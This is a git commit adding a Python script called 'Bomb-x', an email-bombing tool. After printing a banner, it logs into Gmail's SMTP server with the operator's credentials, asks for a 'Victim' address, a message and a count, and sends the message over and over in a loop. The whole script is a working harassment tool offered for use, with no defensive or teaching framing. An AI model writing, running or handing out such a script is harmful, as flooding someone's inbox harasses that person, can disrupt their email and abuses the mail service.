fef5a31e1086eeffd5bd6f728fe6b68e1fe6b634
Bomb-x <93194937+Bomb-x@users.noreply.github.com>
2022-01-23 09:34:47 +0600

    Add files via upload

---
+++ 02.py
@@ -0,0 +1,36 @@
+import os
+r="\033[1;31m"         # Red
+g="\033[1;32m"       # Green
+ye="\033[1;33m"      # Yellow
+b="\033[1;34m"        # Blue
+p="\033[1;35m"      # Purple
+cy="\033[1;36m"        # Cyan
+w="\033[1;37m"       # White
+
+os.system("clear")
+logo=ye+str("""
+______                    _                   
+| ___ \                  | |                  
+| |_/ /  ___   _ __ ___  | |__   ______ __  __
+| ___ \ / _ \ | '_ ` _ \ | '_ \ |______|\ \/ /
+| |_/ /| (_) || | | | | || |_) |         >  < 
+\____/  \___/ |_| |_| |_||_.__/         /_/\_\ 
+===============================================
+     ***[√] Devoloper : Mishkat Zaman***
+===============================================
+            version :2.1.0
+""")
+print(logo)
+import smtplib
+rocx=smtplib.SMTP('smtp.gmail.com','587')
+rocx.ehlo()
+rocx.starttls()
+email=str(input(g+"[√] Enter Your Email : "+r))
+pwd=str(input(b+"[√] Enter Your Password : "+cy))
+rocx.login(email,pwd)
+tmail=str(input(ye+"[√] Enter The Mail Address of Victim : "+w))
+msg=str(input(g+"[√] Enter The Message : "+r))
+amount=int(input(ye+"[√] Enter The Amount : "+w))
+for i in range(amount):
+	rocx.sendmail(email,tmail,msg)
+	print(r+str(i+1)+" [√] ★★Bomb-x★★=>Mail sent ")
